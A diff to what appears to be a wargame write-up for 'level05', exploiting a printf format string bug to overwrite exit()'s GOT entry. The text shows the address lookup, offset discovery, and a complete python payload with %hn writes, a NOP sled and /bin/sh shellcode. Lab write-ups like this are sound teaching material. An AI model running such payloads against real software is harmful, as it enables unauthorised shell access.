@@ -1,6 +1,6 @@
 Small program, and we see an obvious unsafe call to printf(user_input).
 
-exit() being called right after printf() in the program, we can overflow the GOT entry for exit()
+exit() is being called right after printf() in the program, so we can overwrite the GOT entry for exit()
 
 We find the address we need to overwrite :
 
@@ -15,7 +15,7 @@ OFFSET   TYPE              VALUE
 080497e0 R_386_JUMP_SLOT   exit@GLIBC_2.0			--> that's the one ! 0x080497e0
 080497e4 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0
 
-We put this address on the stack to write to it with %n :
+We put this address on the stack to write to it with %n (we quickly find the "argument" offset : 10):
 python -c 'print "\xe0\x97\x04\x08" + "%10$p"' | ./level05
 �0x80497e0
 
@@ -51,7 +51,7 @@ $6 = 65535
 $7 = 54978
 Our final payload will look like this :
 
-[GOT address of exit() 4 bytes] + [GOT address of exit() + 2 (4 bytes)] + [printf padding to reach 54978 bytes printed] + [%10$hn to write 0xd6c2 at exit()] + [printf padding to reach 65535 bytes printed] + [%11$hn to write 0xffff at exit()+2] + [NOP sled \x90 (12 bytes)] + [shellcode (25 bytes) + null byte to end "/bin/sh" because fgets() accepts null bytes >:D]
+[GOT address of exit() 4 bytes] + [GOT address of exit() + 2 (4 bytes)] + [printf padding to reach 54978 bytes printed] + [%10$hn to write 0xd6c2 at exit()] + [printf padding to reach 65535 bytes printed] + [%11$hn to write 0xffff at exit()+2] + [NOP sled \x90 (30 bytes)] + [shellcode (25 bytes) + null byte to end "/bin/sh" because fgets() accepts null bytes >:D]
 
 (python -c 'print "\xe0\x97\x04\x08\xe2\x97\x04\x08" + "%054970x" + "%10$hn" + "%010557x" + "%11$hn" + "\x90" * 30 + "\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00"'; cat) | ./level05
 
